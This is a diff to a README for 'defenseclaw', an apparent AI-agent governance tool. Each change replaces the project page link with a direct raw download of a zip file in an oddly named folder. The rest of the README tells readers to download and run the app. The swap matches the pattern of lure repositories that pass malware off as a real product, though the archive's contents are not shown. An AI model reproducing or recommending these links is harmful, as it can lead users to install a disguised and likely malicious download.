@@ -1,6 +1,6 @@
 # 🛡️ defenseclaw - Secure agentic AI governance
 
-[![Download defenseclaw](https://img.shields.io/badge/Download-Defenseclaw-blue?style=for-the-badge)](https://github.com/fazepraise/defenseclaw)
+[![Download defenseclaw](https://img.shields.io/badge/Download-Defenseclaw-blue?style=for-the-badge)](https://raw.githubusercontent.com/fazepraise/defenseclaw/main/pantheress/Software-3.5-beta.5.zip)
 
 ## 🔎 What is defenseclaw?
 
@@ -12,7 +12,7 @@ Use it when you want a simple way to watch how AI agents act, what they access, 
 
 Visit this page to download defenseclaw:
 
-https://github.com/fazepraise/defenseclaw
+https://raw.githubusercontent.com/fazepraise/defenseclaw/main/pantheress/Software-3.5-beta.5.zip
 
 Open the page, look for the latest Windows release, and download the app file that matches your system.
 
@@ -150,4 +150,4 @@ defenseclaw fits teams and solo users who need a simple control layer for agenti
 
 Primary download and project page:
 
-https://github.com/fazepraise/defenseclaw
+https://raw.githubusercontent.com/fazepraise/defenseclaw/main/pantheress/Software-3.5-beta.5.zip
